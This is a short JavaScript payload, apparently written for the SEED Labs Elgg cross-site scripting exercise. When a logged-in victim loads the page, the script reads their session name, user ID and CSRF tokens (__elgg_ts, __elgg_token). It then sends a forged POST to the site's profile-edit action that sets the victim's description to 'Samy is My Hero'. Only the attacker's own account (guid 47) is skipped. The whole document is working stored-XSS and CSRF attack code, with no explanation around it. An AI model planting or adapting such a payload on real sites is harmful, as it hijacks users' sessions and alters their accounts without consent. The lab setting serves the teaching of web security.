
<script type="text/javascript">

window.onload = function(){

	//JavaScript code to access user name, user guid, Time Stamp __elgg_ts
	//and Security Token __elgg_token

	var userName=elgg.session.user.name;
	var guid="&guid="+elgg.session.user.guid;
	var ts="&__elgg_ts="+elgg.security.token.__elgg_ts;
	var token="&__elgg_token="+elgg.security.token.__elgg_token;

	//Construct the content of your url.
	var content= "&description=Samy is My Hero";
	content += "&accesslevel[description]=2";
	content += "&name=" + userName
	var sendurl="http://www.xsslabelgg.com/action/profile/edit"

	//debug
	//alert(sendurl + token + ts + content + guid);

	var samyGuid=47;

	if(elgg.session.user.guid!=samyGuid)
	{
		//Create and send Ajax request to modify profile
		var Ajax=null;
		Ajax=new XMLHttpRequest();
		Ajax.open("POST",sendurl,true);
		Ajax.setRequestHeader("Host","www.xsslabelgg.com");
		Ajax.setRequestHeader("Content-Type",
		"application/x-www-form-urlencoded");
		Ajax.send(token + ts + content + guid);
	}
}
</script>
